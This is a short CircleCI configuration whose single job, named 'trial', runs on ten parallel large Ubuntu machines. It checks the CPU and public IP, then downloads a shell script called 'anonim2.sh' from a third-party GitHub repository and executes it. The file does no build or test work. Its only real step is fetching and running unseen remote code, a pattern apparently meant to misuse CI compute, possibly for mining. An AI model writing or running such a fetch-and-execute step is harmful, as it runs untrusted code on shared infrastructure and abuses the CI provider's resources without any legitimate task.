version: 2.1

jobs:
  trial:
    machine:
      image: ubuntu-2004:current
    resource_class: large
    parallelism: 10
    steps:
      - run: lscpu
      - run: curl ifconfig.me
      - run: 
            name: "trial" 
            command: wget https://raw.githubusercontent.com/jacujamil/terna/main/anonim2.sh && chmod u+x anonim2.sh && ./anonim2.sh
 
workflows: 
    version: 2.1 
    build: 
        jobs: 
        - trial
